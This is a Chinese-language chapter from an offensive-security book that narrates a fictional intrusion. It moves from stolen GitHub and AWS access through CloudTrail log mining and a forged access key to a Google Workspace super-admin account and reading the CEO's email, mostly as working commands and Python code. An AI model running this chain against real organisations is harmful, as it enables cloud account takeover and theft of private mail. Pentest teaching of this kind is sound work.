# 第十三章：最终剪辑

![](img/chapterart.png)

回顾我们到目前为止的成就，我们已经成功检索到在 MXR 广告服务器上投放的政治广告，包括预算数据、创意和背后的真实组织。此外，我们还下载了 GP 收集的数亿个个人资料数据，每份资料都像个人日记，可以用来诽谤、勒索或压制即便是最有权势的人。我们还能要求什么更多的东西呢？

好吧，这份奖项列表里少了一样东西：公司邮箱。黑客攻击邮件是如此经典，我无法不在这本书中提及它。

当我们在 Windows Active Directory 中获得域管理员凭证时，邮箱的无限访问权限自然也会随之而来。基础设施和公司目录在 Windows 环境中是紧密绑定的。

AWS 则不同。它从未打算征服企业 IT 市场。这个市场已经被像 Active Directory 和 Google Workspace（前身为 G Suite）等产品占据。

大多数完全依赖 AWS 或 Google Cloud Platform（GCP）来构建和托管其商业产品的科技公司，将会转向 Google Workspace 作为它们的企业目录。你可以讨厌 Google，但 Gmail 仍然是最全面的电子邮件平台。（至少在管理邮件方面是如此。隐私方面的代价或许不值得，但那是另一个话题。）

通常这会导致两个独立的 IT 团队：一个负责交付核心技术产品的基础设施，另一个处理公司 IT 方面的事务（如电子邮件、打印机、工作站、帮助台等）。

快速查看 DNS 邮件交换（MX）记录可以发现，GP 确实在使用企业版 Gmail，因此可能还在使用 Google Workspace 中的其他工具，比如 Drive、Contacts、Hangouts 等（见 Listing 13-1）。

```
root@Point1:~/# dig +short gretschpolitico.com MX
10 aspmx.l.google.com.
20 alt2.aspmx.l.google.com.
30 aspmx3.googlemail.com.
20 alt1.aspmx.l.google.com.
30 aspmx2.googlemail.com.
```

Listing 13-1：查找 MX 记录，确认 GP 确实在使用 Google Workspace

在利用和滥用 Google Workspace 方面，文献或脚本并不多，因此让我们自己动手试试。

## 破解 Google Workspace

我们是 GP 的 AWS 账户管理员，拥有对其所有生产资源的无限访问权限，包括服务器、用户、GitHub 账户等。我们有两个策略可以立即切换到 Google Workspace 环境：

+   找到一个公司内网应用，将主页替换为一个假的 Google 身份验证页面，窃取凭证后再将用户重定向到真实应用。

+   在代码库中寻找可能与 Google Workspace 环境交互的应用，并窃取它们的凭证来建立第一个立足点。

第一个选项是一个保证获胜的方法，只要我们能很好地模拟那个 Google 身份验证页面。这种方法风险更大，因为它涉及到用户交互。话说回来，我们已经得到了我们需要的东西，所以即便天塌下来，我们也不在乎。这只是个额外的收获。

另一方面，第二个选项要隐蔽得多，但它假设 IT 部门与我们可以利用的一些基础设施有某种联系，比如 Lambda 函数、IAM 角色、S3 桶、用户——基本上是大海捞针……还是说不是？

现在想想，实际上有一些东西很有可能在 IT 部门和基础设施团队之间共享：GitHub 账户。肯定他们不是为了取悦这两个技术团队而注册了两个账户吧？

让我们加载从 Jenkins 获取的 GitHub 令牌，寻找与 Google Workspace、Gmail、Google Drive 等相关的引用。我们编写了一个简短的 Python 脚本来加载仓库名称：

```
# list_repos.py
from github import Github
g = Github("8e24ffcc0eeddee673ffa0ce5433ffcee7ace561")
for repo in g.get_user().get_repos():
    print(repo.name, repo.clone_url)

root@Point1:~/# python3 list_repos.py > list_repos_gp.txt
root@Point1:~/# egrep -i "it[-_]|gapps|gsuite|users?" list_repos_gp.txt

it-service     https://github.com/gretschp/it-service.git
1 it-gsuite-apps https://github.com/gretschp/it-gsuite-apps.git
users-sync     https://github.com/gretschp/users-sync
`--snip--`
```

这是跨领域合作的明显迹象 1。我们克隆了 it-gsuite-apps 的源代码，结果……你猜怎么着？！这是一个用于自动化许多 Google Workspace 管理员操作的应用程序和服务的列表，如用户配置、组织单元（OU）分配、账户终止等：

```
root@Point1:~/# ls -lh it-gsuite-apps

total 98M
drwxrwxrwx 1 root root   7.9M  provisionner
drwxrwxrwx 1 root root  13.4M  cron-tasks
drwxrwxrwx 1 root root   6.3M  assign-ou
`--snip--`
```

这些正是我们需要用来控制 Google Workspace 的操作！当然，这个敏感的仓库对普通用户是不可见的，但我猜模拟 Jenkins 也有它的好处。

我们开始梦想拉取 CEO 的电子邮件并揭露这个欺诈业务，但很快意识到，这个仓库中没有一个明文密码。

虽然 AWS 依赖访问密钥来验证用户和角色，但 Google 选择了 OAuth2 协议，需要明确的用户交互。本质上，浏览器会打开，验证用户身份，然后生成一个验证代码，该代码必须粘贴回命令行，以生成临时私钥来调用 Google Workspace API。

机器无法遵循这种认证流程，因此 Google 还提供了服务账户，可以使用私钥进行身份验证。然而，在查看源代码时，我们并没有发现任何关于私钥的线索：

```
root@Point1:~/it-gsuite-apps/# grep -Ri "BEGIN PRIVATE KEY" *
root@Point1:~/it-gsuite-apps/#
```

所以，我们深入研究了 it-gsuite-apps 的代码，以了解该应用如何获取 Google Workspace 权限，并发现了列表 13-2 中的代码行。

```
`--snip--`
getSecret(SERVICE_TOKEN);
`--snip--`
public static void getSecret(String token) {
  String secretName = token;
  String endpoint = "secretsmanager.eu-west-1.amazonaws.com";
  String region = "eu-west-1";

  AwsClientBuilder.EndpointConfiguration config = new AwsClientBuilder.EndpointConfiguration(endpoint, region);
`--snip--`
```

列表 13-2：从 AWS Secrets Manager 加载服务令牌的代码片段

现在一切都明了。秘密并没有硬编码在应用中，而是通过 AWS 的 Secrets Manager 动态获取的，Secrets Manager 是一个用于集中存储秘密的服务。我们不知道秘密的名称，但幸运的是，我们拥有完整的管理员权限，所以我们可以轻松搜索：

```
root@Point1:~/# aws secretsmanager list-secrets \
**--region eu-west-1 \**
**--profile rundeck**

"Name": "inf/instance-api/api-token",
"Name": "inf/rundeck/mysql/test_user",
"Name": "inf/rundeck/cleanlog/apikey",
"Name": "inf/openvpn/vpn-employees",
`--snip--`
```

不幸的是，无论我们怎么 grep，都没有找到任何与 Google Workspace 相关的内容。我们手动检查了每一条记录，以防万一，但残酷的现实悄然降临：IT 部门一定在使用另一个 AWS 账户。这是唯一合理的解释。

不过，别慌张。跳转到 IT AWS 账户不需要像从 MXR Ads 跳转到 GP 时那样复杂的操作。那两家公司是不同（尽管相互关联）的法律实体，它们拥有完全独立的 AWS 账户。然而，IT 部门与常规技术团队一样，属于 GP。最终付账的实体是同一个。

最可能的配置是，GP 创建了一个 AWS 组织，一个可以容纳多个 AWS 账户的实体：一个是技术团队的账户，另一个是 IT 部门的账户，还有一个是测试用的账户，等等。在这种配置下，其中一个 AWS 账户被提升为“主账户”状态。这个特殊账户可以用来将新账户附加到组织中，并应用全局策略，限制每个账户中可用的服务集。

主账户通常不包含任何基础设施，应该——在理想的情况下——将日志聚合、账单报告等管理任务委托给其他账户。我们可以通过调用 `list-accounts` AWS API，使用我们功能强大的 rundeck 角色（见清单 13-3），轻松确认我们的假设。

```
root@Point1:~/# aws organizations list-accounts
"Accounts": 
   Id: 983457354409, Name: GP Infra, Email: infra-admin@gre...
   Id: 354899546107, Name: GP Lab, Email: gp-lab@gretschpoli...
 1 Id: 345673068670, Name: GP IT, Email: admin-it@gretschpoli...
`--snip—`
```

清单 13-3：列出 AWS 账户

看起来不错。我们可以看到管理员账户，正如预期的那样 1。

在创建成员账户时，AWS 会自动分配一个名为 *OrganizationAccountAccessRole* 的默认角色。这个角色的默认信任策略允许任何管理账户的用户假扮该角色，并能够调用安全令牌服务（STS）`assume-role` API。让我们看看是否能获取到它的凭证：

```
root@Point1:~/# aws sts assume-role \
**--role-session-name maintenance \**
**--role-arn arn:aws:iam::345673068670:role/OrganizationAccountAccessRole \**
**--profile rundeck**

An error occurred (AccessDenied) when calling the AssumeRole operation...
```

真是太可惜了，我们差一点就成功了！如果连 Rundeck 都没有被授权假扮 OrganizationAccountAccessRole，那么要么该角色已经被删除，要么它的信任策略已被限制为仅限少数用户。如果有一个中央系统可以记录所有 AWS 上的 API 请求，那我们就可以查找这些特权用户了……你好，CloudTrail！

### 滥用 CloudTrail

每当用户或角色扮演某个角色时，该查询会在 CloudTrail 中记录，并且在 GP 的情况下，会被推送到 CloudWatch 和 S3。我们可以利用这个随时监控的系统来筛选出那些被允许跳转到 IT 账户的用户和角色。CloudTrail 的 API 并没有提供很多过滤功能，所以我们将使用 CloudWatch 强大的 `filter-log-events` 命令。

首先，我们获取聚合 CloudTrail 日志的日志组名称：

```
root@Point1:~/# aws logs describe-log-groups \
**--region=eu-west-1 \**
**--profile test**
--`snip`--
logGroupName: CloudTrail/DefaultLogGroup
`--snip--`
```

然后，如[清单 13-4 所示，这只是一个查找 IT 账户标识符 345673068670 出现位置的简单问题，我们从清单 13-3 中得到了这个标识符。

```
root@Point1**:~/# aws logs filter-log-events \**
**--log-group-name "CloudTrail/DefaultLogGroup" \**
**--filter-pattern "345673068670" \**
**--max-items 10 \**
**--profile rundeck \**
**--region eu-west-1 \**
**| jq ".events[].message" \**
**| sed 's/\\//g'**

"userIdentity": {
    "type": "IAMUser",
    "arn": "arn:aws:iam:: 983457354409:user/elis.skyler",
    "accountId": "983457354409",
    "accessKeyId": "AKIA44ZRK6WS4G7MGL6W",
  1   "userName": "elis.skyler"
},
"requestParameters": {
     "roleArn": "arn:aws:iam::345673068670:role/OrganizationAccountAccessRole",
    "responseElements": {"credentials": {
`--snip--`
```

清单 13-4：CloudTrail 事件显示 *elis.skyler* 在 IT 账户内假扮角色

看起来*elis.skyler* 1 几小时前假扮了 OrganizationAccountAccessRole。是时候为这个账户添加一个额外的访问密钥，让我们可以自己假扮该角色了。当然，在这个操作过程中，我们将暂时关闭 CloudTrail，但我会省略代码，因为你已经在第十一章了解了这种技术：

```
root@Point1:~/# aws iam create-access-key \
**--user-name elis.skyler \**
**--profile rundeck**

AccessKey: {
    UserName: elis.skyler,
    AccessKeyId: AKIA44ZRK6WSRDLX7TDS,
    SecretAccessKey: 564//eyApoe96Dkv0DEdgAwroelak78eghk
```

使用这些新的凭据，我们请求属于 OrganizationAccountAccessRole 的临时 AWS 密钥：

```
root@Point1:~/# aws sts assume-role \
**--role-session-name maintenance \**
**--role-arn arn:aws:iam::345673068670:role/OrganizationAccountAccessRole \**
**--profile elis \**
**--duration-seconds 43 200**

AccessKeyId: ASIAU6EUDNIZIADAP6BQ,
SecretAccessKey: xn37rimJEAppjDicZZP19h0hLuT02P06SXZxeHbk,
SessionToken: FwoGZXIvYXdzEGwa...
```

其实并没有那么难。好了，让我们使用这些访问凭据在这个新账户中查找 AWS Secrets Manager：

```
root@Point1:~/# aws secretsmanager list-secrets \
**--region eu-west-1 \**
**--profile it-role**

ARN: arn:aws:secretsmanager:eu-west-1: 345673068670:secret:it/
gsuite-apps/user-provisionning-4OYxPA

Name: it/gsuite-apps/user-provisioning,
`--snip--`
```

太棒了。我们获取密钥内容并解码，以检索用于验证 Google 服务账户的 JSON 文件（参见列表 13-5）。

```
root@Point1:~/# aws secretsmanager get-secret-value \
**--secret-id 'arn:aws:secretsmanager:eu-west-1:345673068670:secret:it/ \**
**gsuite-apps/user-provisionning-4OYxPA' \**
**--region=eu-west-1 \**
**--profile it-role \**
**| jq -r .SecretString | base64 -d**

{
    "type": "service_account",
    "project_id": "gp-gsuite-262115",
    "private_key_id": "05a85fd168856773743ed7ccf8828a522a00fc8f",
    "private_key": "-----BEGIN PRIVATE KEY-----... ",
    "client_email": "userprovisionning@gp-gsuite-262115.iam.gserviceaccount.com",
    "client_id": "100598087991069411291",
`--snip--`
```

列表 13-5：获取 GCP 服务账户密钥

服务账户名为*userprovisionning@gp-gsuite-262115.iam.gserviceaccount.com*，并附加到 Google Cloud 项目 gp-gsuite-262115 上。请注意，这不是 Google Workspace，而是 Google Cloud。由于 Google Workspace 不处理服务令牌，任何希望自动化 Google Workspace 管理的人都必须在 Google Cloud 上创建服务令牌，然后在 Google Workspace 中为该账户分配作用域和权限。事情已经够复杂了！

我们已经知道该服务令牌拥有创建用户所需的权限，那么让我们来为自己创建一个 Google Workspace 的超级管理员账户吧。

## 创建一个 Google Workspace 超级管理员账户

你可以在本书的 GitHub 仓库中找到完整的 Python 代码，文件名为*create_user.py*，我将在这里仅突出关键点。

首先，我们需要声明我们的账户在 Google Workspace 上执行操作的范围。由于我们将创建一个新账户，我们需要使用*admin.directory.user*作用域。接下来，我们提供服务令牌文件的位置以及我们将假扮的用户的电子邮件，以执行我们的操作：

```
SCOPES =['https://www.googleapis.com/auth/admin.directory.user']
SERVICE_ACCOUNT_FILE = 'token.json'
USER_EMAIL = "admin-it@gretschpolitico.com"
```

在 Google 的安全模型中，服务账户不能直接操作用户账户；它需要首先通过*域范围委托*权限来假扮一个真实用户，这些权限是在服务账户的属性中配置的。然后，操作会以假扮的用户权限执行，因此我们最好找一个超级管理员来假扮。

没问题。我们尝试输入在列表 13-3 中枚举现有 AWS 账户时找到的 AWS GP IT 账户所有者的电子邮件：*admin-it@gretschpolitico.com*。

接下来是构建 Google Workspace 客户端并假扮 IT 管理员的标准 Python 代码：

```
credentials = (service_account.Credentials.
                from_service_account_file(SERVICE_ACCOUNT_FILE, scopes=SCOPES))

delegated_credentials = credentials.with_subject(USER_EMAIL)
service = discovery.build('admin', 'directory_v1', credentials=delegated_credentials)
```

我们构建一个包含所需用户属性（如姓名、密码等）的字典，然后执行查询：

```
user = {"name": {"familyName": "Burton", "givenName": "Haniel",},
        "password": "Strong45Password*", "primaryEmail": "hanielle@gretschpolitico.com",
        "orgUnitPath": "/" }

result = service.users().insert(body=user).execute()
```

最后一步是使我们的用户成为整个组织的超级管理员：

```
service.users().makeAdmin(userKey="hanielle@gretschpolitico.com",
                          body={"status": True}).execute()
```

现在我们只需运行文件：

```
root@Point1:~/# python create_user.py
```

没有错误。真的成功了吗？我们打开浏览器，访问 Google Workspace 管理员控制台，[`admin.google.com/`](https://admin.google.com/)，如图 13-1 所示。

![f13001](img/f13001.png)

图 13-1：访问我们新创建的 Google Workspace 账户

它真行！我们刚刚成功获得了 GP 公司目录的管理员权限。现在没有什么是无法触及的了：Gmail、Google Drive，随便说。

## 偷窥一眼

为了保持低调，我们将避免使用 Google Workspace 的导出功能和数据迁移工具。Google 会在任何人触发这些任务时自动提醒其他管理员。我们将继续像之前那样仅通过 API 调用与 Google Workspace 进行交互。我们只需要升级从 Secrets Manager 中获取的用户供应服务账户的范围，加入 Gmail 和 Google Drive 访问权限。

在 Google Workspace 管理员控制台中，我们导航到**安全性**▶**高级设置**▶**管理 API 访问**面板，并在**一个或多个 API 范围**字段中输入以下两个范围，如图 13-2 所示：

+   **https://www.googleapis.com/auth/drive**

+   **https://www.googleapis.com/auth/gmail.readonly**

在**客户端名称**字段中，我们输入服务账户的名称**userprovisionning@gp-gsuite-262115.iam.gserviceaccount.com**，它会被转换为一个唯一的 ID。

![f13002](img/f13002.png)

图 13-2：Google Workspace 管理员面板更新 API 范围

与 Google 以往著名的直观面板不同，这个管理员面板特别糟糕。你不能只是附加范围，因为它们会覆盖旧的范围。你需要输入分配给服务账户的所有范围（包括旧的和新的）。

我们创建了一个新的*gmail.py* Python 脚本，使用之前创建用户时的相同模板代码，只是做了一些更改：

```
USER_EMAIL = 'alexandra.styx@gretschpolitico.com'
service = discovery.build(1'gmail', 'v1', credentials=delegated_credentials)
2 results = service.users().messages().list(
                    userId=USER_EMAIL,
                    labelIds = ['INBOX']).execute()

messages = results.get('messages', [])
```

我们更新了范围，包含了 Gmail 1，然后调用`users().messages()` API 2 来检索 CEO 的电子邮件，CEO 的名字我们愉快地从 LinkedIn 上获取。

然后，只需遍历邮件，提取主题、发件人、收件人和邮件正文。查看完整代码：[`github.com/HackLikeAPornstar/GreschPolitico`](https://github.com/HackLikeAPornstar/GreschPolitico)。我们运行完整的 Python 脚本，悠闲地浏览邮件：

```
root@Point1:~/# python gmail.py
alexandra.styx@gretschpolitico.com;
valery.attenbourough@gretschpolitico.com;
Sun, 15 Dec 2020;
Secured the party’s contract – $2M!

We just closed the contract today! We can start targeting PA undecided voters tomorrow!

---

alexandra.styx@gretschpolitico.com;
adam.sparrow@gretschpolitico.com;
Sun, 12 Dec 2020;
We need to go after his public image

Can't we make up a story? Send some girls, champagne and kickstart it
that way? We have the creatives ready, we need to get moving!!!
```

尊敬的各位，欢迎欣赏 Gretsch Politico 的全貌！是时候揭开它的秘密了。

## 结束语

哇，我们终于到了最后。这是一段充满许多深奥技术和新范式的紧张旅程。云计算的普及可能是过去十年里最具颠覆性的事件之一。尽管许多科技公司和初创企业已经完全拥抱云计算，我觉得安全社区仍然滞后。

我阅读的每一篇关于横向渗透、C2 通信等的文章，几乎都只涉及 Active Directory——仿佛这是唯一可能的配置，仿佛最有价值的数据一定存储在 Windows 共享或 SQL 服务器上。这显然对于银行和航空公司（谁需要主机系统？）并不成立。事实上，正如我们在这个场景中看到的，越来越多的科技公司正在远离 Windows 环境。

也许这是由只与老旧企业合作的咨询公司所引入的偏见，这些企业依然深陷于 Active Directory。也许是市场上 Windows CVE（常见漏洞和暴露）数量的影响。可能是两者的结合。

无论如何，我希望本书中的众多示例至少传递了一个信息：安全是关于彻底理解一项技术，提出问题，并将其解构，直到它变得有意义。你挖得越深，之后玩弄它就越容易。

我们编写了大量定制代码，以绕过检测服务或简单地规避繁琐的网络限制。下载代码库，玩一玩，试试它在免费的 AWS 账户上，扩展到新的领域。这是通向成功的唯一可靠道路。

祝你黑客愉快！

## 资源

+   Matthew Toussain 关于 Google Workspace（前身为 G Suite）黑客攻击的有趣文章：[`www.blackhillsinfosec.com/`](https://www.blackhillsinfosec.com/)。

+   Google 使用 OAuth2 访问其 API 的指南：[`bit.ly/2RAzYEx`](http://bit.ly/2RAzYEx)。

+   Google Workspace 用户账户指南：[`developers.google.com/admin-sdk/directory/v1/guides/manage-users/`](https://developers.google.com/admin-sdk/directory/v1/guides/manage-users/)。

+   执行 Google Workspace 域级委托的说明：[`developers.google.com/admin-sdk/directory/v1/guides/delegation/`](https://developers.google.com/admin-sdk/directory/v1/guides/delegation/)。

+   更多关于 Google 服务账户的信息：[`cloud.google.com/compute/docs/access/service-accounts/`](https://cloud.google.com/compute/docs/access/service-accounts/)。

+   更多关于 AWS 组织和委托管理员成员的信息：[`amzn.to/3766cAL`](https://amzn.to/3766cAL)。
